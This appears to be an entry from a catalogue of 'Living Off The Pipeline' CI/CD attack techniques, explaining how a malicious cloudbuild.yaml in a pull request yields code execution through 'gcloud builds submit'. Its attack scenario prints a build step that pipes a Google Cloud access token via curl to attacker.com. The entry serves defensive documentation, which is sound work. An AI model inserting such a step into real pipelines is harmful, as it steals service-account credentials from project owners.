---
layout: tool
title: gcloud
tags: [cli, config-file, rce]
references:
- https://cloud.google.com/build/docs/configuring-builds/create-basic-configuration
files: [cloudbuild.yaml]
---

## Living Off The Pipeline - gcloud (Google Cloud CLI)

The `gcloud` command-line interface can be abused as a "Living Off The Pipeline" (LOTP) tool. While the CLI's own configuration is secure, specific sub-commands like `gcloud builds submit` operate on repository-local configuration files that can be weaponized by an attacker.

### First-Order LOTP Tool

`gcloud` is a **First-Order LOTP Tool**. It provides Remote Code Execution (RCE) by processing a malicious `cloudbuild.yaml` file.

#### Malicious Primitive: Remote Code Execution (RCE)

The `gcloud builds submit` command takes a configuration file (commonly `cloudbuild.yaml`) that defines the steps for a remote build on Google Cloud Build. This file can contain a `steps` section, where each step can run arbitrary shell commands.

An attacker can add a malicious step to the `cloudbuild.yaml` in their pull request. When a CI/CD pipeline executes `gcloud builds submit`, it sends this malicious configuration to the Google Cloud Build service, which then executes the attacker's payload on a remote build worker. While the RCE is not on the initial CI runner, it is still a full RCE in a trusted cloud environment.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request with a malicious `cloudbuild.yaml` file.
    ```yaml
    # cloudbuild.yaml
    steps:
      # This step will run on a Google Cloud Build worker and exfiltrate its credentials.
      - name: 'gcr.io/cloud-builders/gcloud'
        entrypoint: 'sh'
        args:
          - '-c'
          - |
            gcloud auth print-access-token | curl -X POST -d @- http://attacker.com/
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to submit the project to Google Cloud Build.
    ```yaml
    - name: Submit build to GCP
      run: gcloud builds submit --config cloudbuild.yaml .
    ```

3.  **Execution:**
    *   The `gcloud builds submit` command is executed.
    *   It uploads the repository contents, including the malicious `cloudbuild.yaml`, to Google Cloud.
    *   The Google Cloud Build service starts a new build, reads the attacker's configuration, and executes the malicious step.
    *   The attacker's `curl` command runs on the Cloud Build worker, stealing the service account's access token.

This attack is dangerous because the CI/CD workflow file contains a legitimate and common command. The malicious payload is hidden in a project configuration file that defines a remote, trusted build process.
